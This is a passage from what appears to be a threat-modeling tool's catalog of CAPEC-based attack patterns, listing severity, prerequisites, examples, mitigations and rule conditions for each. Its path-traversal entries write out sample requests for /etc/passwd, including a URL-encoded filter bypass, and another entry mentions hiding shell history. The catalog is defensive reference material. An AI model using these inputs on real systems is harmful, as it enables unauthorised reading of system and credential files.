  <dd>https://capec.mitre.org/data/definitions/123.html, http://cwe.mitre.org/data/definitions/119.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.usesSecureFunctions is False</dd>
</dl>



## AC02 Shared Data Manipulation

An adversary exploits a data structure shared between multiple applications or an application pool to affect application behavior. Data may be shared between multiple applications or between multiple threads of a single application. Data sharing is usually accomplished through mutual access to a single memory location. If an adversary can manipulate this shared data (usually by co-opting one of the applications or threads) the other applications or threads using the shared data will often continue to trust the validity of the compromised shared data and use it in their calculations. This can result in invalid trust assumptions, corruption of additional data through the normal operations of the other users of the shared data, or even cause a crash or compromise of the sharing applications.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target applications (or target application threads) must share data between themselves.The adversary must be able to manipulate some piece of the shared data either directly or indirectly and the other users of the data must accept the changed data as valid. Usually this requires that the adversary be able to compromise one of the sharing applications or threads in order to manipulate the shared data.</dd>

  <dt>Example</dt>
  <dd>Adversary was able to compromise one of the sharing applications or data stores in order to manipulate shared data.</dd>

  <dt>Mitigations</dt>
  <dd>Use strong authentication and authorization mechanisms. Use HTTPS/SSL for communication.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/124.html</dd>

  <dt>Condition</dt>
  <dd>target.isShared is True</dd>
</dl>



## DO01 Flooding

An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>Any target that services requests is vulnerable to this attack on some level of scale.</dd>

  <dt>Example</dt>
  <dd>Adversary tries to bring a network or service down by flooding it with large amounts of traffic.</dd>

  <dt>Mitigations</dt>
  <dd>Ensure that protocols have specific limits of scale configured. Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits. Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/125.html, http://cwe.mitre.org/data/definitions/404.html, http://cwe.mitre.org/data/definitions/770.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.handlesResourceConsumption is False or target.controls.isResilient is False</dd>
</dl>



## HA01 Path Traversal

An adversary uses path manipulation methods to exploit insufficient input validation of a target to obtain access to data that should be not be retrievable by ordinary well-formed requests. A typical variety of this attack involves specifying a path to a desired file together with dot-dot-slash characters, resulting in the file access API or function traversing out of the intended directory structure and into the root file system. By replacing or modifying the expected path information the access function or API retrieves the file desired by the attacker. These attacks either involve the attacker providing a complete path to a targeted file or using control characters (e.g. path separators (/ or ) and/or dots (.)) to reach desired directories or files.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>The attacker must be able to control the path that is requested of the target.The target must fail to adequately sanitize incoming paths</dd>

  <dt>Example</dt>
  <dd>An example of using path traversal to attack some set of resources on a web server is to use a standard HTTP request http://example/../../../../../etc/passwd From an attacker point of view, this may be sufficient to gain access to the password file on a poorly protected system. If the attacker can list directories of critical resources then read only access is not sufficient to protect the system.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Configure the access control correctly. Design: Enforce principle of least privilege. Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution. Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host. 6. Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands. Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/126.html, http://cwe.mitre.org/data/definitions/22.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False and target.controls.sanitizesInput is False</dd>
</dl>



## AC03 Subverting Environment Variable Values

The attacker directly or indirectly modifies environment variables used by or controlling the target software. The attacker's goal is to cause the target software to deviate from its expected operation in a manner that benefits the attacker.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>An environment variable is accessible to the user.An environment variable used by the application can be tainted with user supplied data.Input data used in an environment variable is not validated properly.The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an attacker may attempt to manipulate that variable.</dd>

  <dt>Example</dt>
  <dd>Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the attacker upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as 172.16.2.100shared_filestrojan_dll.dll. See also: Path Manipulation (CVE-1999-0073). The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to ignorespace. HISTCONTROL can also be set to ignore duplicate commands by setting it to ignoredups. In some Linux systems, this is set by default to ignoreboth which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.</dd>

  <dt>Mitigations</dt>
  <dd>Protect environment variables against unauthorized read and write access. Protect the configuration files which contain environment variables against illegitimate read and write access. Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Apply the least privilege principles. If a process has no legitimate reason to read an environment variable do not give that privilege.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/13.html, http://cwe.mitre.org/data/definitions/353.html, http://cwe.mitre.org/data/definitions/15.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/302.html</dd>

  <dt>Condition</dt>
  <dd>target.usesEnvironmentVariables is True and (target.controls.implementsAuthenticationScheme is False or target.controls.validatesInput is False or target.controls.authorizesSource is False)</dd>
</dl>



## DO02 Excessive Allocation

An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation.</dd>

  <dt>Example</dt>
  <dd>In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.</dd>

  <dt>Mitigations</dt>
  <dd>Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.handlesResourceConsumption is False</dd>
</dl>



## DS02 Try All Common Switches

An attacker attempts to invoke all common switches and options in the target application for the purpose of discovering weaknesses in the target. For example, in some applications, adding a --debug switch causes debugging information to be displayed, which can sometimes reveal sensitive processing or configuration information to an attacker. This attack differs from other forms of API abuse in that the attacker is blindly attempting to invoke options in the hope that one of them will work rather than specifically targeting a known option. Nonetheless, even if the attacker is familiar with the published options of a targeted application this attack method may still be fruitful as it might discover unpublicized functionality.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The attacker must be able to control the options or switches sent to the target.</dd>

  <dt>Example</dt>
  <dd>Adversary is able to exploit the debug switch to discover unpublicized functionality.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Minimize switch and option functionality to only that necessary for correct function of the command. Implementation: Remove all debug and testing options from production code.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/133.html, http://cwe.mitre.org/data/definitions/912.html</dd>

  <dt>Condition</dt>
  <dd>target.environment == 'Production'</dd>
</dl>



## INP08 Format String Injection

An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The target application must accept a strings as user input, fail to sanitize string formatting characters in the user input, and process this string using functions that interpret string formatting characters.</dd>

  <dt>Example</dt>
  <dd>Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks.</dd>

  <dt>Mitigations</dt>
  <dd>Limit the usage of formatting string functions. Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/135.html, http://cwe.mitre.org/data/definitions/134.html, http://cwe.mitre.org/data/definitions/133.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False</dd>
</dl>



## INP09 LDAP Injection

An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed.</dd>

  <dt>Example</dt>
  <dd>PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack.</dd>

  <dt>Mitigations</dt>
  <dd>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/136.html, http://cwe.mitre.org/data/definitions/77.html, http://cwe.mitre.org/data/definitions/90.html, http://cwe.mitre.org/data/definitions/20.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False</dd>
</dl>



## INP10 Parameter Injection

An adversary manipulates the content of request parameters for the purpose of undermining the security of the target. Some parameter encodings use text characters as separators. For example, parameters in a HTTP GET message are encoded as name-value pairs separated by an ampersand (&). If an attacker can supply text strings that are used to fill in these parameters, then they can inject special characters used in the encoding scheme to add or modify parameters. For example, if user input is fed directly into an HTTP GET request and the user provides the value myInput&new_param=myValue, then the input parameter is set to myInput, but a new parameter (new_param) is also added with a value of myValue. This can significantly change the meaning of the query that is processed by the server. Any encoding scheme where parameters are identified and separated by text characters is potentially vulnerable to this attack - the HTTP GET encoding used above is just one example.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target application must use a parameter encoding where separators and parameter identifiers are expressed in regular text.The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.</dd>

  <dt>Example</dt>
  <dd>The target application accepts a string as user input, fails to sanitize characters that have a special meaning in the parameter encoding, and inserts the user-supplied string in an encoding which is then processed.</dd>

  <dt>Mitigations</dt>
  <dd>Implement an audit log written to a separate host. In the event of a compromise, the audit log may be able to provide evidence and details of the compromise. Treat all user input as untrusted data that must be validated before use.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/137.html, http://cwe.mitre.org/data/definitions/88.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False</dd>
</dl>



## INP11 Relative Path Traversal

An attacker exploits a weakness in input validation on the target by supplying a specially constructed path utilizing dot and slash characters for the purpose of obtaining access to arbitrary files or resources. An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or ) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The target application must accept a string as user input, fail to sanitize combinations of characters in the input that have a special meaning in the context of path navigation, and insert the user-supplied string into path navigation commands.</dd>

  <dt>Example</dt>
  <dd>The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach. Implementation: Prefer working without user input when using file system calls. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/139.html, http://cwe.mitre.org/data/definitions/23.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False</dd>
</dl>



## INP12 Client-side Injection-induced Buffer Overflow

This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The targeted client software communicates with an external server.The targeted client software has a buffer overflow vulnerability.</dd>

  <dt>Example</dt>
  <dd>Attack Example: Buffer Overflow in Internet Explorer 4.0 Via EMBED Tag Authors often use EMBED tags in HTML documents. For example <EMBED TYPE=audio/midi SRC=/path/file.mid AUTOSTART=true If an attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild.</dd>

  <dt>Mitigations</dt>
  <dd>The client software should not install untrusted code from a non-authenticated server. The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers. Perform input validation for length of buffer inputs. Use a language or compiler that performs automatic bounds checking. Use an abstraction library to abstract away risky APIs. Not a complete solution. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Ensure all buffer uses are consistently bounds-checked. Use OS-level preventative functionality. Not a complete solution.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/14.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/353.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.checksInputBounds is False and target.controls.validatesInput is False</dd>
</dl>



## AC04 XML Schema Poisoning

An adversary corrupts or modifies the content of XML schema information passed between a client and server for the purpose of undermining the security of the target. XML Schemas provide the structure and content definitions for XML documents. Schema poisoning is the ability to manipulate a schema either by replacing or modifying it to compromise the programs that process documents that use this schema. Possible attacks are denial of service attacks by modifying the schema so that it does not contain required information for subsequent processing. For example, the unaltered schema may require a @name attribute in all submitted documents. If the adversary removes this attribute from the schema then documents created using the new grammar may lack this field, which may cause the processing application to enter an unexpected state or record incomplete data. In addition, manipulation of the data types described in the schema may affect the results of calculations taken by the document reader. For example, a float field could be changed to an int field. Finally, the adversary may change the encoding defined in the schema for certain fields allowing the contents to bypass filters that scan for dangerous strings. For example, the modified schema might us a URL encoding instead of ASCII, and a filter that catches a semicolon (;) might fail to detect its URL encoding (%3B).

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Some level of access to modify the target schema.The schema used by the target application must be improperly secured against unauthorized modification and manipulation.</dd>

  <dt>Example</dt>
  <dd>XML Schema Poisoning Attacks can often occur locally due to being embedded within the XML document itself or being located on the host within an improperaly protected file. In these cases, the adversary can simply edit the XML schema without the need for additional privileges. An example of the former can be seen below: <?xml version=1.0?> <!DOCTYPE contact [ <!ELEMENT contact (name,phone,email,address)> <!ELEMENT name (#PCDATA)> <!ELEMENT phone (#PCDATA)> <!ELEMENT email (#PCDATA)> <!ELEMENT address (#PCDATA)> ]> <note> <name>John Smith</name> <phone>555-1234</phone> <email>jsmith@email.com</email> <address>1 Example Lane</address> </note></capec:Code> If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur.XML Schema Poisoning Attacks can also be executed remotely if the HTTP protocol is being used to transport data. : <?xml version=1.0?> <!DOCTYPE contact SYSTEM http://example.com/contact.dtd[ <note> <name>John Smith</name> <phone>555-1234</phone> <email>jsmith@email.com</email> <address>1 Example Lane</address> </note></capec:Code> The HTTP protocol does not encrypt the traffic it transports, so all communication occurs in plaintext. This traffic can be observed and modified by the adversary during transit to alter the XML schema before it reaches the end user. The adversary can perform a Man-in-the-Middle (MITM) Attack to alter the schema in the same way as the previous example and to acheive the same results.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Protect the schema against unauthorized modification. Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the XML document. Additionally, ensure that the proper permissions are set on local files to avoid unauthorized modification. Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/146.html, http://cwe.mitre.org/data/definitions/15.html, http://cwe.mitre.org/data/definitions/472.html</dd>

  <dt>Condition</dt>
  <dd>any(d.format == 'XML' for d in target.data) and target.controls.authorizesSource is False</dd>
</dl>



## DO03 XML Ping of the Death

An attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target. Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target must receive and process XML transactions.</dd>

  <dt>Example</dt>
  <dd>Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval. Implementation: Provide for network flow control and traffic shaping to control access to the resources.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/147.html, http://cwe.mitre.org/data/definitions/400.html, http://cwe.mitre.org/data/definitions/770.html</dd>

  <dt>Condition</dt>
  <dd>any(d.format == 'XML' for d in target.data)</dd>
</dl>



## AC05 Content Spoofing

An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target must provide content but fail to adequately protect it against modification.The adversary must have the means to alter data to which he/she is not authorized.If the content is to be modified in transit, the adversary must be able to intercept the targeted messages.</dd>

  <dt>Example</dt>
  <dd>An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.</dd>

  <dt>Mitigations</dt>
  <dd>Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html</dd>

  <dt>Condition</dt>
  <dd>((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))</dd>
</dl>



## INP13 Command Delimiters

An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or a blacklist input validation, as opposed to whitelist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or blacklist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Software's input validation or filtering must not detect and block presence of additional malicious command.</dd>

  <dt>Example</dt>
  <dd>By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior. LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Perform whitelist validation against a positive specification for command length, type, and parameters.Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged accountImplementation: Perform input validation for all remote content.Implementation: Use type conversions such as JDBC prepared statements.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/15.html, http://cwe.mitre.org/data/definitions/146.html, http://cwe.mitre.org/data/definitions/77.html, http://cwe.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/154.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False</dd>
</dl>



## INP14 Input Data Manipulation

An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target must accept user data for processing and the manner in which this data is processed must depend on some aspect of the format or flags that the attacker can control.</dd>

  <dt>Example</dt>
  <dd>A target application has an integer variable for which only some integer values are expected by the application. But since it does not have any checks in place to validate the value of the input, the attacker is able to manipulate the targeted integer variable such that normal operations result in non-standard values.</dd>

  <dt>Mitigations</dt>
  <dd>Validation of user input for type, length, data-range, format, etc.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/153.html, http://cwe.mitre.org/data/definitions/20.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False</dd>
</dl>



## DE03 Sniffing Attacks

In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target data stream must be transmitted on a medium to which the adversary has access.</dd>

  <dt>Example</dt>
  <dd>Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</dd>

  <dt>Mitigations</dt>
  <dd>Encrypt sensitive information when transmitted on insecure mediums to prevent interception.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html</dd>

  <dt>Condition</dt>
  <dd>(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False</dd>
</dl>



## CR03 Dictionary-based Password Attack

An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The system uses one factor password based authentication.The system does not have a sound password policy that is being enforced.The system does not implement an effective password throttling mechanism.</dd>

  <dt>Example</dt>
  <dd>A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096</dd>

  <dt>Mitigations</dt>
  <dd>Create a strong password policy and ensure that your system enforces this policy.Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/16.html, http://cwe.mitre.org/data/definitions/521.html, http://cwe.mitre.org/data/definitions/262.html, http://cwe.mitre.org/data/definitions/263.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.implementsAuthenticationScheme is False</dd>
</dl>



## API02 Exploit Script-Based APIs

Some APIs support scripting instructions as arguments. Methods that take scripted instructions (or references to scripted instructions) can be very flexible and powerful. However, if an attacker can specify the script that serves as input to these methods they can gain access to a great deal of functionality. For example, HTML pages support <script> tags that allow scripting languages to be embedded in the page and then interpreted by the receiving web browser. If the content provider is malicious, these scripts can compromise the client application. Some applications may even execute the scripts under their own identity (rather than the identity of the user providing the script) which can allow attackers to perform activities that would otherwise be denied to them.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target application must include the use of APIs that execute scripts.The target application must allow the attacker to provide some or all of the arguments to one of these script interpretation methods and must fail to adequately filter these arguments for dangerous or unwanted script commands.</dd>

  <dt>Example</dt>
  <dd>Since APIs can be accessed over the internet just like any other URI with some sensitive data attached to the request, they share the vulnerabilities of any other resource accessible on the internet like Man-in-the-middle, CSRF Attack, Denial of Services, etc.</dd>

  <dt>Mitigations</dt>
